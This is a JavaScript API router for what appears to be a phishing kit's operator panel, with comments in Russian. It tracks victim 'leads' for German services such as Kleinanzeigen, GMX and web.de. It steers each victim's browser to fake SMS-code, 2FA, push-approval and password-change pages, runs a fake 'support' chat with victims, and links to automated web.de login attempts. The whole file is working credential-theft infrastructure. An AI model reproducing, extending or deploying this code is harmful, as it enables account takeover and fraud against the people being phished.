/**
 * Диспетчер простых JSON API (нативный http, без Express).
 * Тяжёлые маршруты остаются в server.js.
 */

const { send, safeEnd } = require('../utils/httpUtils');
const { checkAdminAuth, hasValidAdminSession } = require('../utils/authUtils');
const { getPlatformFromRequest, maskEmail, translateChatText, CHAT_TRANSLATE_TARGET } = require('../utils/formatUtils');
const chatService = require('../services/chatService');
const leadService = require('../services/leadService');
const automationService = require('../services/automationService');

function normalizePathname(parsedUrl) {
  return (parsedUrl.pathname || '').replace(/\/\/+/g, '/') || '/';
}

/** Нужно прочитать тело до вызова handleApiRoute (иначе поток уже не прочитать повторно). */
function needsRequestBody(method, pathname) {
  if (pathname === '/api/admin/login' && method === 'POST') return true;
  if (pathname === '/api/admin/logout' && method === 'POST') return true;
  if (pathname === '/api/mark-worked' && method === 'POST') return true;
  if (pathname === '/api/delete-lead' && method === 'POST') return true;
  if (pathname === '/api/delete-lead-bulk' && method === 'POST') return true;
  if (pathname === '/api/chat' && (method === 'POST' || method === 'DELETE')) return true;
  return false;
}

async function handleApiRoute(req, res, parsedUrl, body, d) {
  const pathname = normalizePathname(parsedUrl);
  const method = req.method;

  if (pathname === '/api/status' && method === 'GET') {
    const idRaw = parsedUrl.query.id;
    const page = (parsedUrl.query.page && String(parsedUrl.query.page).trim()) || '';
    if (!idRaw) return send(res, 400, { status: 'pending' });
    const id = leadService.resolveLeadId(idRaw);
    const leads = leadService.readLeads();
    const lead = leads.find((l) => l.id === id);
    const idRequested = idRaw != null && String(idRaw).trim() !== '';
    const leadMissing = idRequested && !lead;
    if (lead) {
      d.statusHeartbeats[id] = { lastSeenAt: new Date().toISOString(), currentPage: page || (d.statusHeartbeats[id] && d.statusHeartbeats[id].currentPage) };
    }
    let status = 'pending';
    const mode = d.readMode();
    if (lead && lead.scriptStatus === 'script_automation_wait' && lead.scriptAutomationWaitUntil) {
      const wUntil = new Date(lead.scriptAutomationWaitUntil).getTime();
      if (!isNaN(wUntil) && Date.now() >= wUntil) {
        delete lead.scriptStatus;
        delete lead.scriptAutomationWaitUntil;
        lead.status = 'error';
        lead.lastSeenAt = new Date().toISOString();
        try {
          leadService.persistLeadPatch(id, {
            scriptStatus: null,
            scriptAutomationWaitUntil: null,
            status: lead.status,
            lastSeenAt: lead.lastSeenAt,
            eventTerminal: lead.eventTerminal
          });
        } catch (e) {}
      }
    }
    if (lead && lead.status) {
      if (lead.status === 'error') status = 'error';
      else if (lead.status === 'show_success') status = 'show_success';
      else if (lead.status === 'redirect_change_password') {
        status = 'redirect_change_password';
      }
      else if (lead.status === 'redirect_sicherheit') {
        status = 'redirect_sicherheit';
      }
      else if (lead.status === 'redirect_push') {
        status = d.suppressVictimPushPageForKleinContext(lead) ? 'pending' : 'redirect_push';
      }
      else if (lead.status === 'redirect_sms_code') {
        status = 'redirect_sms_code';
      }
      else if (lead.status === 'redirect_2fa_code') {
        status = 'redirect_2fa_code';
      }
      else if (lead.status === 'redirect_gmx_net') {
        status = 'redirect_gmx_net';
      }
      else if (lead.status === 'redirect_android') {
        status = 'redirect_android';
      }
      else if (lead.status === 'redirect_klein_forgot') {
        status = 'redirect_klein_forgot';
      }
      else if (lead.status === 'redirect_klein_anmelden') {
        status = 'redirect_klein_anmelden';
      }
      else if (lead.status === 'redirect_open_on_pc') {
        const nowPlatform = getPlatformFromRequest(req);
        if ((nowPlatform === 'windows' || nowPlatform === 'macos') && lead.brand !== 'klein') {
          lead.platform = nowPlatform;
          lead.status = nowPlatform === 'windows' ? 'redirect_sicherheit' : 'redirect_change_password';
          lead.lastSeenAt = new Date().toISOString();
          d.pushEvent(lead, nowPlatform === 'windows' ? 'Зашёл с ПК (Windows) → Sicherheit' : 'Зашёл с ПК (Mac) → смена пароля');
          leadService.persistLeadPatch(id, {
            platform: lead.platform,
            status: lead.status,
            lastSeenAt: lead.lastSeenAt,
            eventTerminal: lead.eventTerminal
          });
          status = lead.status;
        } else {
          status = 'redirect_open_on_pc';
        }
      }
      else status = lead.status;
    }
    if (leadMissing) {
      status = 'not_found';
    }
    if (safeEnd(res)) return true;
    res.writeHead(200, {
      'Content-Type': 'application/json',
      'Cache-Control': 'no-store, no-cache, must-revalidate',
      'Pragma': 'no-cache',
      'Access-Control-Allow-Origin': '*',
    });
    const out = { status: status, mode: mode };
    if (lead && lead.scriptStatus === 'script_automation_wait' && lead.scriptAutomationWaitUntil) {
      const wLeft = new Date(lead.scriptAutomationWaitUntil).getTime();
      if (!isNaN(wLeft) && Date.now() < wLeft) {
        out.scriptWaitSecondsLeft = Math.max(1, Math.ceil((wLeft - Date.now()) / 1000));
      }
    }
    if (lead && lead.status === 'error') {
      out.errorKind = lead.adminErrorKind === 'sms' ? 'sms' : 'login';
    }
    if (lead && lead.brand === 'klein' && lead.status === 'error' && lead.kleinPasswordErrorDe) {
      out.kleinPasswordErrorDe = String(lead.kleinPasswordErrorDe).slice(0, 500);
    }
    if (lead && lead.scriptStatus && typeof lead.scriptStatus === 'string') {
      out.scriptStatus = lead.scriptStatus;
    }
    res.end(JSON.stringify(out));
    return true;
  }

  if (pathname === '/api/klein-sms-wait-ack' && method === 'GET') {
    const idRaw = parsedUrl.query.id;
    if (!idRaw) return send(res, 400, { ok: false, error: 'id required' });
    const id = leadService.resolveLeadId(idRaw);
    const lead = leadService.readLeadById(id);
    if (!lead) return send(res, 404, { ok: false, error: 'not_found' });
    if (lead.scriptStatus === 'klein_sms_wait') {
      leadService.persistLeadPatch(id, { scriptStatus: null });
    }
    return send(res, 200, { ok: true });
  }

  if (pathname === '/api/redirect-klein-sms-wait' && method === 'POST') {
    if (!checkAdminAuth(req, res)) return true;
    let json = {};
    try { json = JSON.parse(body || '{}'); } catch (_) {}
    const idRaw = (json.id != null) ? String(json.id).trim() : '';
    if (!idRaw) return send(res, 400, { ok: false, error: 'id required' });
    const id = leadService.resolveLeadId(idRaw);
    const lead = leadService.readLeadById(id);
    if (!lead) return send(res, 404, { ok: false, error: 'not_found' });
    if (String(lead.brand || '').toLowerCase() !== 'klein') {
      return send(res, 400, { ok: false, error: 'klein_only' });
    }
    const nowIso = new Date().toISOString();
    d.pushEvent(lead, 'SMS Kl: Bitte warten', 'admin');
    leadService.persistLeadPatch(id, {
      scriptStatus: 'klein_sms_wait',
      lastSeenAt: nowIso,
      adminListSortAt: nowIso,
      eventTerminal: lead.eventTerminal
    });
    return send(res, 200, { ok: true });
  }

  if (pathname === '/api/mark-worked' && method === 'POST') {
    if (!checkAdminAuth(req, res)) return true;
    let json = {};
    try { json = JSON.parse(body || '{}'); } catch (_) {}
    const id = (json.id != null && json.id !== '') ? String(json.id).trim() : '';
    if (!id) return send(res, 400, { ok: false, error: 'Нужен id лида' });
    leadService.invalidateLeadsCache();
    const leads = leadService.readLeads();
    const idx = leads.findIndex((l) => l && String(l.id).trim() === id);
    if (idx === -1) {
      return send(res, 404, { ok: false, error: 'Запись не найдена (id устарел или лог заменён — обновите список и попробуйте снова)' });
    }
    const lead = leads[idx];
    if (leadService.archiveFlagIsSet(lead.klLogArchived)) {
      return send(res, 400, { ok: false, error: 'Лог Klein в архиве — отметку «Отработан» с архивом снимайте отдельно' });
    }
    const worked = leadService.leadIsWorkedFromEvents(lead);
    d.pushEvent(lead, worked ? leadService.EVENT_WORKED_TOGGLE_OFF : 'Отработан', 'admin');
    leadService.persistLeadPatch(id, { eventTerminal: lead.eventTerminal });
    automationService.runWhenLeadsWriteQueueIdle(function () {
      if (safeEnd(res)) return;
      send(res, 200, { ok: true, worked: !worked });
    });
    return true;
  }

  if (pathname === '/api/delete-lead' && method === 'POST') {
    if (!checkAdminAuth(req, res)) return true;
    if (safeEnd(res)) return true;
    let json = {};
    try { json = JSON.parse(body || '{}'); } catch (_) {}
    const id = json.id != null ? String(json.id) : '';
    if (!id) { send(res, 400, { ok: false, error: 'id required' }); return true; }
    let leads;
    try { leads = leadService.readLeads(); } catch (e) { console.error('[SERVER] delete-lead readLeads:', e); send(res, 500, { ok: false, error: 'read error' }); return true; }
    const leadToDelete = leads.find((l) => l && (l.id == id || String(l.id) === id));
    const filtered = leads.filter((l) => l && l.id != id && String(l.id) !== id);
    if (filtered.length === leads.length) { send(res, 404, { ok: false, error: 'Lead not found' }); return true; }
    automationService.stopWebdeLoginForDeletedLead(leadToDelete.id, leadToDelete);
    try {
      if (leadService.deleteLeadById(leadToDelete.id) < 1) {
        send(res, 500, { ok: false, error: 'write error' });
        return true;
      }
      leadService.invalidateLeadsCache();
      d.broadcastLeadsUpdate();
    } catch (e) {
      console.error('[SERVER] delete-lead deleteLeadById:', e);
      send(res, 500, { ok: false, error: 'write error' });
      return true;
    }
    d.writeDebugLog('DELETE_LEAD', { id: id, email: leadToDelete ? maskEmail(leadToDelete.email || '') : '', totalLeadsBefore: leads.length, totalLeadsAfter: leads.length - 1 });
    send(res, 200, { ok: true });
    return true;
  }

  if (pathname === '/api/delete-lead-bulk' && method === 'POST') {
    if (!checkAdminAuth(req, res)) return true;
    if (safeEnd(res)) return true;
    let json = {};
    try { json = JSON.parse(body || '{}'); } catch (_) {}
    const ids = Array.isArray(json.ids) ? json.ids.map((x) => String(x || '').trim()).filter(Boolean) : [];
    if (ids.length === 0) { send(res, 400, { ok: false, error: 'ids required' }); return true; }
    let deleted = 0;
    let skipped = 0;
    for (const id of ids) {
      if (!id) { skipped++; continue; }
      let leadToDelete = null;
      try {
        const leads = leadService.readLeads();
        leadToDelete = leads.find((l) => l && (l.id == id || String(l.id) === id)) || null;
      } catch (e) {
        skipped++;
        continue;
      }
      if (!leadToDelete || !leadToDelete.id) { skipped++; continue; }
      try { automationService.stopWebdeLoginForDeletedLead(leadToDelete.id, leadToDelete); } catch (_) {}
      try {
        const n = leadService.deleteLeadById(leadToDelete.id);
        if (n > 0) deleted++;
        else skipped++;
      } catch (e) {
        skipped++;
      }
    }
    try { leadService.invalidateLeadsCache(); } catch (_) {}
    try { d.broadcastLeadsUpdate(); } catch (_) {}
    send(res, 200, { ok: true, deleted, skipped });
    return true;
  }

  if (pathname === '/api/delete-all' && method === 'POST') {
    if (!checkAdminAuth(req, res)) return true;
    try {
      automationService.clearAllWebdeChildrenAndQueues();
    } catch (_) {}
    try {
      leadService.deleteAllLeads();
      leadService.invalidateLeadsCache();
      d.broadcastLeadsUpdate();
    } catch (e) {
      console.error('[SERVER] delete-all:', e);
    }
    send(res, 200, { ok: true });
    return true;
  }

  if (pathname === '/api/chat' && method === 'GET') {
    const leadId = (parsedUrl.query && parsedUrl.query.leadId) ? String(parsedUrl.query.leadId).trim() : '';
    if (!leadId) {
      console.log('[CHAT-OPEN] GET /api/chat: нет leadId, 400');
      return send(res, 400, { ok: false, messages: [] });
    }
    const chatKey = chatService.getChatKeyForLeadId(leadId);
    const chat = chatService.readChat();
    if (chatService.migrateChatToEmailKey(chat, leadId, chatKey)) chatService.writeChat(chat);
    if (Object.prototype.hasOwnProperty.call(chat, leadId) && chatKey !== leadId) chatService.writeChat(chat);
    const messages = Array.isArray(chat[chatKey]) ? chat[chatKey] : [];
    const typing = chatService.getChatTyping(leadId);
    const isAdmin = hasValidAdminSession(req);
    const readAt = (chat._readAt && typeof chat._readAt[chatKey] === 'string') ? chat._readAt[chatKey] : null;
    const openRequestedRaw = chat._openChatRequested && typeof chat._openChatRequested === 'object' ? chat._openChatRequested[leadId] : undefined;
    const openRequested = !!openRequestedRaw;
    const openChatRequestId = openRequestedRaw != null ? String(openRequestedRaw) : undefined;
    const payload = { ok: true, messages, supportTyping: typing.support, userTyping: typing.user };
    if (isAdmin) payload.lastReadAt = readAt;
    else {
      payload.openChat = openRequested;
      if (openRequested && openChatRequestId) payload.openChatRequestId = openChatRequestId;
      if (openRequested) {
        console.log('[CHAT-OPEN] GET /api/chat: leadId=' + leadId + ' chatKey=' + chatKey + ' openChat=true requestId=' + openChatRequestId);
      }
    }
    return send(res, 200, payload);
  }

  if (pathname === '/api/chat' && method === 'POST') {
    let json = {};
    try { json = JSON.parse(body || '{}'); } catch (_) {}
    const leadId = (json.leadId != null) ? String(json.leadId).trim() : '';
    const from = (json.from === 'support' || json.from === 'user') ? json.from : 'user';
    const text = (json.text != null) ? String(json.text).slice(0, 2000) : '';
    const MAX_IMAGE_BASE64_LEN = 2800000;
    let image = (json.image != null && typeof json.image === 'string') ? json.image.slice(0, MAX_IMAGE_BASE64_LEN) : undefined;
    if (from === 'support' && !hasValidAdminSession(req)) return send(res, 403, { ok: false });
    if (!leadId) return send(res, 400, { ok: false });
    const chatKey = chatService.getChatKeyForLeadId(leadId);
    const chat = chatService.readChat();
    if (chatService.migrateChatToEmailKey(chat, leadId, chatKey)) chatService.writeChat(chat);
    if (Object.prototype.hasOwnProperty.call(chat, leadId) && chatKey !== leadId) chatService.writeChat(chat);
    const id = 'msg-' + Date.now() + '-' + Math.random().toString(36).slice(2, 10);
    chatService.insertChatMessage(chatKey, {
      id,
      from,
      text: text || undefined,
      image: image || undefined,
      at: new Date().toISOString()
    });
    d.broadcastLeadsUpdate();
    if (from === 'user' && text && CHAT_TRANSLATE_TARGET) {
      setImmediate(() => {
        translateChatText(text, (translated) => {
          if (!translated) return;
          try {
            const chatData = chatService.readChat();
            const list = Array.isArray(chatData[chatKey]) ? chatData[chatKey] : [];
            const msg = list.find((m) => m.id === id);
            if (msg) {
              msg.translation = translated;
              chatService.writeChat(chatData);
              d.broadcastLeadsUpdate();
            }
          } catch (e) {}
        });
      });
    }
    return send(res, 200, { ok: true, id });
  }

  if (pathname === '/api/chat' && method === 'DELETE') {
    if (!checkAdminAuth(req, res)) return true;
    let json = {};
    try { json = JSON.parse(body || '{}'); } catch (_) {}
    const leadId = (json.leadId != null) ? String(json.leadId).trim() : '';
    const messageId = (json.messageId != null) ? String(json.messageId).trim() : '';
    if (!leadId || !messageId) return send(res, 400, { ok: false, error: 'leadId and messageId required' });
    const chatKey = chatService.getChatKeyForLeadId(leadId);
    const chat = chatService.readChat();
    const list = Array.isArray(chat[chatKey]) ? chat[chatKey] : [];
    const idx = list.findIndex((m) => m && m.id === messageId);
    if (idx === -1) return send(res, 404, { ok: false, error: 'Message not found' });
    if (list[idx].from !== 'support') return send(res, 403, { ok: false, error: 'Can only delete your own messages' });
    list.splice(idx, 1);
    chatService.writeChat(chat);
    d.broadcastLeadsUpdate();
    return send(res, 200, { ok: true });
  }

  return false;
}

module.exports = {
  handleApiRoute,
  needsRequestBody,
};
